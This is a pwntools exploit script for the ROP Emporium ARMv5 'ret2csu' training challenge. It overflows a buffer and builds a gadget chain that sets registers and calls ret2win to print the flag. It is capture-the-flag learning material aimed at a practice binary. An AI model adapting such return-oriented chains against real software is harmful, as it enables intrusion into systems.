#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# ropemporium ARMv5 ret2csu
context.terminal=["/usr/bin/xterm", "-fa", "Monospace", "-fs","12", "-e"]
# Set up pwntools for the correct architecture
elf = context.binary = ELF('ret2csu_armv5')

# 164 : read
# 176 : ret
gs='''
b *pwnme+176
'''

# Gadgets
# pop {r4, r5, r6, r7, r8, sb, sl, pc} 
g_pop_r45678 = 0x00010644

# pop {r3, pc}
g_pop_r3 = 0x00010474 

# mov r2, sb; mov r1, r8; mov r0, r7; blx r3
g_movs_blx_r3 = 0x0001062c

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])

ret2win = elf.plt['ret2win']

io.recvuntil(b"> ")

offset=0x24

flagfile=b"flag.txt"

PL=b"A"*offset
# Chargement des registres r4..r10
PL+=p32(g_pop_r45678)
PL+=p32(0)               # r4
PL+=p32(0)               # r5
PL+=p32(0)               # r6
PL+=p32(0xdeadbeef)      # r7
PL+=p32(0xcafebabe)      # r8
PL+=p32(0xd00df00d)      # sb 
PL+=p32(0)               # sl
# Cahrgement de r3 <= re2win@plt
PL+=p32(g_pop_r3)
PL+=p32(ret2win)

PL+=p32(g_movs_blx_r3)   # mov r2, sb; mov r1, r8; mov r0, r7; blx r3

io.sendline(PL)

io.recvuntil(b"ROPE")
flag=io.recvline().decode()
log.success(f"flag : ROPE{flag}")
io.close()

